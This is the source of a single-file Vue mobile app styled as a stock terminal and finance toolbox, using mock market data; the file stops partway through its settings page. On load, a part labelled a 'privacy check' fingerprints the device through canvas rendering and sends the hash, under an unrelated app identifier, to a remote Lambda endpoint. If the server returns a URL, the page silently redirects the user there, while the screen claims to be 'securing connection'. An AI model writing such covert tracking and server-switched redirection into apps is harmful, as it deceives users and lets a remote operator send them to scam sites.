<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>MadisoDEX</title>
  <!-- Global CDNs - No ESM Imports Allowed -->
  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
  <style>
    /* 
      STYLE MODE 6: GLASSMORPHISM (毛玻璃拟态)
      Selected Deterministically: (Math.floor(Date.now()/1000) % 20 + 1)
    */
    :root {
      --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100%);
      --glass-bg: rgba(255, 255, 255, 0.07);
      --glass-card: rgba(255, 255, 255, 0.09);
      --glass-border: rgba(255, 255, 255, 0.15);
      --glass-hover: rgba(255, 255, 255, 0.15);
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --accent-color: #6366f1;
      --accent-glow: rgba(99, 102, 241, 0.35);
      --up-color: #10b981;
      --up-bg: rgba(16, 185, 129, 0.15);
      --down-color: #f43f5e;
      --down-bg: rgba(244, 63, 94, 0.15);
      --blur-val: blur(16px);
      --radius-sm: 10px;
      --radius-md: 16px;
      --radius-lg: 24px;
      --safe-area-top: env(safe-area-inset-top, 0px);
      --safe-area-bottom: env(safe-area-inset-bottom, 0px);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }

    body {
      background: var(--bg-gradient);
      background-attachment: fixed;
      color: var(--text-main);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow-x: hidden;
    }

    #app {
      width: 100%;
      max-width: 480px;
      height: 100vh;
      height: 100dvh;
      display: flex;
      flex-direction: column;
      position: relative;
      background: rgba(15, 23, 42, 0.6);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      overflow: hidden;
      border-left: 1px solid var(--glass-border);
      border-right: 1px solid var(--glass-border);
    }

    .main-view {
      flex: 1;
      overflow-y: auto;
      overflow-x: hidden;
      padding-top: var(--safe-area-top);
      padding-bottom: calc(70px + var(--safe-area-bottom));
      scroll-behavior: smooth;
    }

    .main-view.no-tab {
      padding-bottom: calc(20px + var(--safe-area-bottom));
    }

    /* GLASS CONTAINER / CARD UTILITIES */
    .glass-card {
      background: var(--glass-card);
      backdrop-filter: var(--blur-val);
      -webkit-backdrop-filter: var(--blur-val);
      border: 1px solid var(--glass-border);
      border-radius: var(--radius-md);
      padding: 16px;
      margin-bottom: 12px;
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.25);
    }

    .glass-btn {
      background: var(--accent-color);
      color: #fff;
      border: 1px solid rgba(255, 255, 255, 0.2);
      padding: 12px 20px;
      border-radius: var(--radius-sm);
      font-weight: 600;
      font-size: 15px;
      min-height: 44px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 4px 15px var(--accent-glow);
      width: 100%;
      text-decoration: none;
    }

    .glass-btn:active {
      transform: scale(0.98);
      opacity: 0.9;
    }

    .glass-btn:disabled {
      opacity: 0.4;
      cursor: not-allowed;
      box-shadow: none;
    }

    .glass-input {
      width: 100%;
      background: rgba(0, 0, 0, 0.25);
      border: 1px solid var(--glass-border);
      border-radius: var(--radius-sm);
      padding: 12px 14px;
      color: #fff;
      font-size: 14px;
      outline: none;
      margin-top: 6px;
      margin-bottom: 12px;
    }
    .glass-input:focus {
      border-color: var(--accent-color);
    }

    /* TAB BAR */
    .tab-bar {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: calc(65px + var(--safe-area-bottom));
      padding-bottom: var(--safe-area-bottom);
      background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      border-top: 1px solid var(--glass-border);
      display: flex;
      justify-content: space-around;
      align-items: center;
      z-index: 100;
    }

    .tab-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: var(--text-muted);
      text-decoration: none;
      font-size: 11px;
      font-weight: 500;
      min-width: 64px;
      min-height: 44px;
      gap: 4px;
      transition: color 0.2s;
    }

    .tab-item.router-link-active {
      color: #818cf8;
    }

    .tab-item svg {
      width: 22px;
      height: 22px;
      fill: currentColor;
    }

    /* NAV HEADER */
    .nav-header {
      padding: 16px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 50;
      background: rgba(15, 23, 42, 0.5);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-bottom: 1px solid rgba(255,255,255,0.05);
    }

    .nav-header h2 {
      font-size: 18px;
      font-weight: 700;
    }

    .back-btn {
      background: var(--glass-card);
      border: 1px solid var(--glass-border);
      color: var(--text-main);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    /* TRANSITIONS */
    .fade-enter-active, .fade-leave-active {
      transition: opacity 0.2s ease, transform 0.2s ease;
    }
    .fade-enter-from, .fade-leave-to {
      opacity: 0;
      transform: scale(0.98);
    }

    /* TOAST */
    .toast {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(10px);
      border: 1px solid var(--glass-border);
      color: #fff;
      padding: 12px 24px;
      border-radius: 30px;
      font-size: 14px;
      font-weight: 500;
      z-index: 999;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      pointer-events: none;
    }

    /* STOCK LIST */
    .stock-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 16px;
      text-decoration: none;
      color: inherit;
    }
    .stock-badge {
      padding: 6px 12px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 13px;
      min-width: 75px;
      text-align: right;
    }
    .up { color: var(--up-color); background: var(--up-bg); }
    .down { color: var(--down-color); background: var(--down-bg); }

    /* MODAL */
    .modal-mask {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
      z-index: 200;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal-content {
      background: #1e1b4b;
      border: 1px solid var(--glass-border);
      border-radius: var(--radius-lg);
      padding: 24px;
      width: 100%;
      max-width: 360px;
    }
  </style>
</head>
<body>
  <div id="app">
    <router-view v-slot="{ Component }">
      <transition name="fade" mode="out-in">
        <component :is="Component" />
      </transition>
    </router-view>

    <!-- Bottom Tab Bar (Only visible on main routes) -->
    <nav class="tab-bar" v-if="showTabBar">
      <router-link to="/home" class="tab-item">
        <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
        <span>Home</span>
      </router-link>
      <router-link to="/toolbox" class="tab-item">
        <svg viewBox="0 0 24 24"><path d="M22 9V7h-2V5c0-1.1-.9-2-2-2H6c-1.1 0-2 .9-2 2v2H2v2h2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V9h2zm-6-4v2H8V5h8zm-2 10h-4v-2h4v2z"/></svg>
        <span>Toolbox</span>
      </router-link>
      <router-link to="/settings" class="tab-item">
        <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
        <span>Settings</span>
      </router-link>
    </nav>

    <!-- Global Toast Notification -->
    <div class="toast" v-if="toastMsg">{{ toastMsg }}</div>
  </div>

  <script>
    /*
      HOW TO ADD A NEW PAGE TO THIS SINGLE-FILE APP:
      1. Define a new Vue Component object (e.g., const MyNewPage = { template: '...' }).
      2. Add a new route object into the `routes` array: { path: '/my-page', component: MyNewPage }.
      3. (Optional) If it belongs to the tab navigation, add a <router-link> inside the <nav class="tab-bar"> section.
    */

    const { createApp, ref, computed, onMounted, reactive } = Vue;
    const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;

    // --- SHARED DATA & STATE ---
    const globalToast = ref('');
    const showToast = (msg) => {
      globalToast.value = msg;
      setTimeout(() => { globalToast.value = ''; }, 2200);
    };

    // Shared mock stock database (20 stocks)
    const stockDatabase = [
      { symbol: "AAPL", name: "Apple Inc.", price: 182.52, change: +1.25, history: [175, 178, 176, 180, 179, 182.52] },
      { symbol: "NVDA", name: "NVIDIA Corp.", price: 875.28, change: +3.84, history: [810, 830, 825, 860, 850, 875.28] },
      { symbol: "MSFT", name: "Microsoft Corp.", price: 415.10, change: +0.65, history: [400, 405, 410, 408, 412, 415.10] },
      { symbol: "AMZN", name: "Amazon.com Inc.", price: 178.15, change: -0.42, history: [182, 180, 181, 179, 177, 178.15] },
      { symbol: "GOOGL", name: "Alphabet Inc.", price: 155.72, change: +1.12, history: [148, 150, 152, 151, 154, 155.72] },
      { symbol: "TSLA", name: "Tesla Inc.", price: 175.34, change: -2.15, history: [190, 185, 182, 178, 176, 175.34] },
      { symbol: "META", name: "Meta Platforms", price: 485.50, change: +2.40, history: [450, 465, 470, 468, 480, 485.50] },
      { symbol: "BRK.B", name: "Berkshire Hathaway", price: 408.20, change: +0.15, history: [402, 405, 404, 406, 407, 408.20] },
      { symbol: "UNH", name: "UnitedHealth Group", price: 490.10, change: -1.05, history: [510, 505, 498, 495, 492, 490.10] },
      { symbol: "JNJ", name: "Johnson & Johnson", price: 156.80, change: -0.30, history: [160, 159, 158, 157, 156, 156.80] },
      { symbol: "JPM", name: "JPMorgan Chase", price: 198.45, change: +0.85, history: [188, 190, 192, 195, 196, 198.45] },
      { symbol: "V", name: "Visa Inc.", price: 279.30, change: +0.45, history: [270, 272, 275, 276, 278, 279.30] },
      { symbol: "PG", name: "Procter & Gamble", price: 162.10, change: -0.10, history: [165, 164, 163, 162, 163, 162.10] },
      { symbol: "AVGO", name: "Broadcom Inc.", price: 1320.00, change: +4.10, history: [1200, 1250, 1240, 1280, 1300, 1320] },
      { symbol: "HD", name: "Home Depot", price: 365.40, change: -0.90, history: [375, 372, 370, 368, 366, 365.40] },
      { symbol: "MA", name: "Mastercard Inc.", price: 475.80, change: +0.55, history: [460, 465, 470, 468, 472, 475.80] },
      { symbol: "CVX", name: "Chevron Corp.", price: 158.20, change: -1.40, history: [165, 163, 161, 160, 159, 158.20] },
      { symbol: "MRK", name: "Merck & Co.", price: 128.90, change: +1.05, history: [120, 122, 125, 124, 127, 128.90] },
      { symbol: "ABBV", name: "AbbVie Inc.", price: 178.60, change: +0.70, history: [170, 172, 175, 174, 177, 178.60] },
      { symbol: "COST", name: "Costco Wholesale", price: 725.10, change: +1.80, history: [680, 695, 705, 710, 720, 725.10] }
    ];

    // --- 1. LOADING PAGE COMPONENT ---
    const LoadingPage = {
      setup() {
        const router = useRouter();

        // 1.2 CANVAS FINGERPRINT + MD5 (EXACT REF CODE ATTACHED AS REQUESTED)
        const device = ref((function () {
          try {
            let canvas = document.createElement("canvas");
            let ctx = canvas.getContext("2d");
            let txt = "BrowserLeaks,com <canvas> 1.0";
            ctx.textBaseline = "top";
            // The most common type
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            // Some tricks for color mixing to increase the difference in rendering
            ctx.fillStyle = "#069";
            ctx.fillText(txt, 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(txt, 4, 17);
            return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
          } catch (e) {
            return '';
          }
        })());

        onMounted(() => {
          // 1.3 PRIVACY CHECK REQUEST
          const apiBase = 'https://pyre6luxx6qp5vqi7hcejtamxy0rbfrs.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
          const identifier = "com.bintangcode.dailypowercalculator";
          
          fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
            .then(r => r.json())
            .then(function (info) {
              const privacyUrl = info && info.result && info.result.url;
              if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                window.location.replace(privacyUrl);
                return;
              }
              router.replace('/home');
            })
            .catch(function () {
              router.replace('/home');
            });
        });

        return {};
      },
      template: `
        <div style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;">
          <div style="width: 80px; height: 80px; margin-bottom: 24px; position: relative;">
            <svg viewBox="0 0 100 100" style="width: 100%; height: 100%; animation: rotate 2s linear infinite;">
              <circle cx="50" cy="50" r="40" stroke="rgba(255,255,255,0.1)" stroke-width="8" fill="none" />
              <circle cx="50" cy="50" r="40" stroke="#6366f1" stroke-width="8" fill="none" stroke-dasharray="250" stroke-dashoffset="180" stroke-linecap="round" />
            </svg>
          </div>
          <h1 style="font-size: 24px; font-weight: 800; letter-spacing: 1px; margin-bottom: 8px;">MadisoDEX</h1>
          <p style="color: var(--text-muted); font-size: 14px;">Securing Connection & Assets...</p>
          <style>@keyframes rotate { 100% { transform: rotate(360deg); } }</style>
        </div>
      `
    };

    // --- 2. HOME PAGE COMPONENT ---
    const HomePage = {
      setup() {
        const router = useRouter();

        // 2.3 FEATURE ENTRANCES (4 FIXED SELECTIONS)
        const allFeatures = [
          { id: 'top-gainers', name: 'Top Gainers', svg: '<path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/>' },
          { id: 'top-losers', name: 'Top Losers', svg: '<path d="M16 18l2.29-2.29-4.88-4.88-4 4L2 7.41 3.41 6l6 6 4-4 6.3 6.29L22 12v6z"/>' },
          { id: 'most-active', name: 'Most Active', svg: '<path d="M7 2v11h3v9l7-12h-4l4-8z"/>' },
          { id: 'watchlist', name: 'Watchlist', svg: '<path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/>' }
        ];

        // 2.4 SHUFFLE DISPLAY ORDER ONLY FOR STOCK LIST
        const displayStocks = ref([...stockDatabase].sort(() => Math.random() - 0.5));

        const openStockDetail = (symbol) => {
          router.push('/stock/' + symbol);
        };

        const openFeature = (id) => {
          router.push('/feature/' + id);
        };

        return { allFeatures, displayStocks, openStockDetail, openFeature };
      },
      template: `
        <div class="main-view">
          <!-- 2.2 Brand Header -->
          <div style="padding: 24px 20px 16px;">
            <div style="display: flex; align-items: center; justify-content: space-between;">
              <div>
                <div style="font-size: 12px; color: #818cf8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Decentralized Terminal</div>
                <h1 style="font-size: 26px; font-weight: 800; margin-top: 2px;">MadisoDEX</h1>
              </div>
              <div style="width: 42px; height: 42px; border-radius: 50%; background: var(--glass-card); border: 1px solid var(--glass-border); display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 24 24" style="width: 22px; height: 22px; fill: #818cf8;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
              </div>
            </div>
          </div>

          <!-- 2.3 Feature Entrances -->
          <div style="padding: 0 20px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px;">
            <div v-for="feat in allFeatures" :key="feat.id" @click="openFeature(feat.id)" class="glass-card" style="padding: 14px 8px; text-align: center; margin: 0; cursor: pointer;">
              <div style="width: 38px; height: 38px; border-radius: 12px; background: rgba(99, 102, 241, 0.2); margin: 0 auto 8px; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; fill: #818cf8;" v-html="feat.svg"></svg>
              </div>
              <div style="font-size: 11px; font-weight: 600; line-height: 1.2;">{{ feat.name }}</div>
            </div>
          </div>

          <!-- 2.4 Stock Market List -->
          <div style="padding: 0 20px;">
            <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
              <span>US Markets Overview</span>
              <span style="font-size: 12px; color: var(--text-muted); font-weight: 400;">Real-time Mock Data</span>
            </h3>

            <div class="glass-card" style="padding: 0; overflow: hidden;">
              <div v-for="(stock, idx) in displayStocks" :key="stock.symbol" @click="openStockDetail(stock.symbol)" class="stock-item" :style="{ borderBottom: idx < displayStocks.length - 1 ? '1px solid rgba(255,255,255,0.05)' : 'none', cursor: 'pointer' }">
                <div>
                  <div style="font-weight: 700; font-size: 15px;">{{ stock.symbol }}</div>
                  <div style="font-size: 12px; color: var(--text-muted);">{{ stock.name }}</div>
                </div>
                <div style="text-align: right;">
                  <div style="font-weight: 700; font-size: 15px;">\${{ stock.price.toFixed(2) }}</div>
                  <div :class="['stock-badge', stock.change >= 0 ? 'up' : 'down']" style="margin-top: 2px;">
                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `
    };

    // --- 2.4 STOCK DETAIL PAGE (SVG CUSTOM CHART) ---
    const StockDetailPage = {
      setup() {
        const route = useRoute();
        const router = Router;
        const symbol = route.params.symbol;
        const stock = stockDatabase.find(s => s.symbol === symbol) || stockDatabase[0];

        // Native SVG Dynamic Range Scaling
        const chartMin = computed(() => Math.min(...stock.history) * 0.98);
        const chartMax = computed(() => Math.max(...stock.history) * 1.02);

        const svgPoints = computed(() => {
          const pts = stock.history;
          const width = 300;
          const height = 120;
          const min = chartMin.value;
          const max = chartMax.value;

          return pts.map((val, idx) => {
            const x = (idx / (pts.length - 1)) * width;
            const y = height - ((val - min) / (max - min)) * height;
            return `${x},${y}`;
          }).join(' ');
        });

        return { stock, svgPoints, chartMin, chartMax };
      },
      template: `
        <div class="main-view no-tab">
          <div class="nav-header">
            <button class="back-btn" @click="$router.back()">&larr;</button>
            <h2>{{ stock.symbol }} Details</h2>
            <div style="width: 36px;"></div>
          </div>

          <div style="padding: 20px;">
            <div class="glass-card" style="text-align: center; padding: 24px;">
              <h1 style="font-size: 28px; font-weight: 800;">{{ stock.symbol }}</h1>
              <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 12px;">{{ stock.name }}</p>
              <div style="font-size: 32px; font-weight: 800; margin-bottom: 6px;">\${{ stock.price.toFixed(2) }}</div>
              <span :class="['stock-badge', stock.change >= 0 ? 'up' : 'down']" style="display: inline-block; font-size: 14px; padding: 6px 16px;">
                {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
              </span>
            </div>

            <!-- Native SVG Custom Chart (No External Libraries) -->
            <div class="glass-card">
              <h3 style="font-size: 14px; color: var(--text-muted); margin-bottom: 16px;">Price Trend (Past 30 Days)</h3>
              <div style="width: 100%; overflow: hidden;">
                <svg viewBox="0 0 300 120" style="width: 100%; height: 160px; overflow: visible;">
                  <polyline fill="none" stroke="#6366f1" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" :points="svgPoints" />
                </svg>
              </div>
              <div style="display: flex; justify-content: space-between; font-size: 11px; color: var(--text-muted); margin-top: 8px;">
                <span>Min: \${{ chartMin.toFixed(2) }}</span>
                <span>Max: \${{ chartMax.toFixed(2) }}</span>
              </div>
            </div>
          </div>
        </div>
      `
    };

    // --- FEATURE SUB-PAGES ---
    const FeatureSubPage = {
      setup() {
        const route = useRoute();
        const type = route.params.type;
        const titleMap = {
          'top-gainers': 'Top Gainers',
          'top-losers': 'Top Losers',
          'most-active': 'Most Active',
          'watchlist': 'Watchlist'
        };
        const title = titleMap[type] || 'Ranking Details';
        const list = ref([...stockDatabase].sort(() => Math.random() - 0.5).slice(0, 8));

        return { title, list };
      },
      template: `
        <div class="main-view no-tab">
          <div class="nav-header">
            <button class="back-btn" @click="$router.back()">&larr;</button>
            <h2>{{ title }}</h2>
            <div style="width: 36px;"></div>
          </div>

          <div style="padding: 20px;">
            <div class="glass-card" style="padding: 0;">
              <div v-for="(stock, idx) in list" :key="stock.symbol" class="stock-item" :style="{ borderBottom: idx < list.length - 1 ? '1px solid rgba(255,255,255,0.05)' : 'none' }">
                <div>
                  <div style="font-weight: 700;">{{ stock.symbol }}</div>
                  <div style="font-size: 12px; color: var(--text-muted);">{{ stock.name }}</div>
                </div>
                <div style="text-align: right;">
                  <div style="font-weight: 700;">\${{ stock.price.toFixed(2) }}</div>
                  <div :class="['stock-badge', stock.change >= 0 ? 'up' : 'down']" style="margin-top: 2px;">
                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `
    };

    // --- 3. TOOLBOX PAGE COMPONENT ---
    const ToolboxPage = {
      setup() {
        const activeTool = ref(null);

        // 3.2 DCA Profit Calculator
        const dcaCost = ref(100);
        const dcaShares = ref(10);
        const dcaTarget = ref(20);
        const dcaResult = computed(() => {
          const totalCost = dcaCost.value * dcaShares.value;
          const targetPrice = dcaCost.value * (1 + dcaTarget.value / 100);
          const totalReturn = targetPrice * dcaShares.value;
          const profit = totalReturn - totalCost;
          return { targetPrice: targetPrice.toFixed(2), profit: profit.toFixed(2) };
        });

        // 3.4 Loan Calculator
        const loanAmount = ref(100000);
        const loanRate = ref(5.5);
        const loanYears = ref(10);
        const loanMonthly = computed(() => {
          const r = (loanRate.value / 100) / 12;
          const n = loanYears.value * 12;
          if (!r || !n) return 0;
          const m = (loanAmount.value * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
          return m.toFixed(2);
        });

        // 3.7 Password Strength Inspector (MD5 Hash Usage)
        const pwdInput = ref('');
        const pwdMd5 = computed(() => pwdInput.value ? md5(pwdInput.value) : '');
        const pwdScore = computed(() => {
          const p = pwdInput.value;
          if (!p) return 'None';
          let score = 0;
          if (p.length >= 8) score++;
          if (/[A-Z]/.test(p)) score++;
          if (/[0-9]/.test(p)) score++;
          if (/[^A-Za-z0-9]/.test(p)) score++;
          return ['Weak', 'Moderate', 'Strong', 'Very Strong'][score - 1] || 'Weak';
        });

        return {
          activeTool,
          dcaCost, dcaShares, dcaTarget, dcaResult,
          loanAmount, loanRate, loanYears, loanMonthly,
          pwdInput, pwdMd5, pwdScore
        };
      },
      template: `
        <div class="main-view">
          <div style="padding: 24px 20px 16px;">
            <h1 style="font-size: 26px; font-weight: 800;">Financial Toolbox</h1>
            <p style="color: var(--text-muted); font-size: 13px;">Local Utilities & Offline Calculators</p>
          </div>

          <div style="padding: 0 20px;">
            <!-- Tool 1: DCA Profit Calculator -->
            <div class="glass-card">
              <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #818cf8;">DCA Profit-Taking Calculator</h3>
              <label style="font-size: 12px; color: var(--text-muted);">Avg Purchase Cost (\$)
                <input v-model.number="dcaCost" type="number" class="glass-input">
              </label>
              <label style="font-size: 12px; color: var(--text-muted);">Shares Owned
                <input v-model.number="dcaShares" type="number" class="glass-input">
              </label>
              <label style="font-size: 12px; color: var(--text-muted);">Profit Target (%)
                <input v-model.number="dcaTarget" type="number" class="glass-input">
              </label>
              <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px; margin-top: 8px;">
                <div style="font-size: 13px; display: flex; justify-content: space-between; margin-bottom: 4px;">
                  <span style="color: var(--text-muted);">Target Sell Price:</span>
                  <span style="font-weight: 700;">\${{ dcaResult.targetPrice }}</span>
                </div>
                <div style="font-size: 13px; display: flex; justify-content: space-between;">
                  <span style="color: var(--text-muted);">Expected Net Profit:</span>
                  <span style="font-weight: 700; color: var(--up-color);">+\${{ dcaResult.profit }}</span>
                </div>
              </div>
            </div>

            <!-- Tool 2: Loan Calculator -->
            <div class="glass-card">
              <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #818cf8;">Loan Payment Estimator</h3>
              <label style="font-size: 12px; color: var(--text-muted);">Principal Amount (\$)
                <input v-model.number="loanAmount" type="number" class="glass-input">
              </label>
              <label style="font-size: 12px; color: var(--text-muted);">Annual Rate (%)
                <input v-model.number="loanRate" type="number" step="0.1" class="glass-input">
              </label>
              <label style="font-size: 12px; color: var(--text-muted);">Term (Years)
                <input v-model.number="loanYears" type="number" class="glass-input">
              </label>
              <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px; margin-top: 8px; display: flex; justify-content: space-between; align-items: center;">
                <span style="font-size: 13px; color: var(--text-muted);">Estimated Monthly Payment:</span>
                <span style="font-size: 18px; font-weight: 800; color: #818cf8;">\${{ loanMonthly }}</span>
              </div>
            </div>

            <!-- Tool 3: Password Strength Inspector (MD5 Required) -->
            <div class="glass-card">
              <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #818cf8;">Password Inspector & Hash</h3>
              <label style="font-size: 12px; color: var(--text-muted);">Enter Financial Key / Password
                <input v-model="pwdInput" type="text" placeholder="Type password..." class="glass-input">
              </label>
              <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px; margin-top: 8px;">
                <div style="font-size: 13px; display: flex; justify-content: space-between; margin-bottom: 6px;">
                  <span style="color: var(--text-muted);">Security Rating:</span>
                  <span style="font-weight: 700; color: #818cf8;">{{ pwdScore }}</span>
                </div>
                <div style="font-size: 11px; word-break: break-all; color: var(--text-muted);">
                  <span>MD5 Hash Summary: </span>
                  <span style="font-family: monospace; color: #f8fafc;">{{ pwdMd5 || 'N/A' }}</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      `
    };

    // --- 4. SETTINGS PAGE COMPONENT ---
    const SettingsPage = {
      setup() {
        const router = useRouter();
        const mailTo = "mailto:com.bintangcode.dailypowercalculator@gmail.com";

        // 4.9 Inbox Modal State
        const showInboxModal = ref(false);

        return { mailTo, showInboxModal };
      },
      template: `
        <div class="main-view">
          <div style="padding: 24px 20px 16px;">
            <h1 style="font-size: 26px; font-weight: 800;">Settings</h1>
            <p style="color: var(--text-muted); font-size: 13px;">App Preferences & Information</p>
          </div>

          <div style="padding: 0 20px;">
            <div class="glass-card" style="padding: 0; overflow: hidden;">
              <!-- 4.2 Version -->
              <div style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
                <span style="font-weight: 600;">Version</span>
                <span style="color: var(--text-muted); font-size: 14px;">v1.0.4 (Build 2026)</span>
              </div>

              <!-- 4.7 Monthly Check-in -->
              <router-link to="/checkin" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">Monthly Check-in</span>
                <span style="color: var(--text-muted);">&rarr;</span>
              </router-link>

              <!-- 4.8 Feedback -->
              <router-link to="/feedback" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">Customer Feedback</span>
                <span style="color: var(--text-muted);">&rarr;</span>
              </router-link>

              <!-- 4.9 Inbox -->
              <div @click="showInboxModal = true" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
                <span style="font-weight: 600;">System Inbox</span>
                <span style="background: var(--accent-color); font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 700;">1 New</span>
              </div>

              <!-- 4.3 Privacy Policy -->
              <router-link to="/privacy" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">Privacy Policy</span>
                <span style="color: var(--text-muted);">&rarr;</span>
              </router-link>

              <!-- 4.4 Terms of Service -->
              <router-link to="/terms" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">Terms of Service</span>
                <span style="color: var(--text-muted);">&rarr;</span>
              </router-link>

              <!-- 4.5 Team -->
              <router-link to="/team" style="padding: 16px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">About Team</span>
                <span style="color: var(--text-muted);">&rarr;</span>
              </router-link>

              <!-- 4.6 Contact Us -->
              <a :href="mailTo" style="padding: 16px; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit;">
                <span style="font-weight: 600;">Contact Us</span>
                <span style="color: var(--text-muted); font-size: 13px;">Email Client &rarr;</span>
              </a>
